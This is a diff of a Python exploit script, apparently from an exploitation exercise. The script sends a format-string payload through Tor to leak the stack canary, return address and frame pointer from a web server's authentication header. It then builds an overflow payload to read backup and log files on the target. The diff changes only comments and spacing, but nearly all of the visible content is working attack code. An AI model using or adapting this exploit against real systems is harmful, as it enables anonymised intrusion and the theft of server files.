@@ -5,7 +5,7 @@ import os
 
 rt = RequestsTor() #for Tor Browser
 rt = RequestsTor(tor_ports=(9050,), tor_cport=9051) #for Tor
-# rt = RequestsTor(tor_ports=(9150,), tor_cport=9151) #for Windows Tor
+#rt = RequestsTor(tor_ports=(9150,), tor_cport=9151) #for Windows Tor
 
 #rt = requests #To run the attack locally, comment out the first two lines about Tor and uncomment this line here.
 
@@ -19,7 +19,6 @@ headers={
 #Getting the information leak from format string parameter exploit using the headers above. Authorization consists of the string %x. repeated 31 times (in base64 encoded format).
 r = rt.get(url, headers=headers)
 header_data = r.headers['WWW-Authenticate'].split(sep='\"')[1].split(sep=r'.')[-5:]#The last five values are the ones we need.
-#print(header_data)
 
 #Getting return address, ebp and canary.
 ret_addr = header_data[-1]
@@ -34,12 +33,14 @@ ret_addr = hex(ret_hex)[2:]
 buffer_addr = int(ebp, base=16) - 232
 buffer_addr = hex(buffer_addr)[2:]
 
-#Text payload is the path of z.log and some 26's (ascii of &) needed for alignment. (sic for other files?)
+#Text payload is the path of z.log and some 26's (ascii of &) needed for alignment. (To get the other files switch out the comments between the other text_payloads)
 text_payload_1 = "/var/backup/z.log&&&"
-# text_payload_1 = "/var/backup/backup.log&&"
-# text_payload_1 = "/var/backup/index.html&&"
+#text_payload_1 = "/var/backup/backup.log&&"
+#text_payload_1 = "/var/backup/index.html&&"
+
 padding_size = int((60 - len(text_payload_1))/4)
 text_payload_1 = ''.join(hex(ord(x))[2:] for x in text_payload_1)
+
 #Some executions have 00 at the end of the return address, so we replace it with 26 here (it will be replaced by 00 by the for loop anyway).
 ret_addr = ret_addr.replace('00', '26')
 
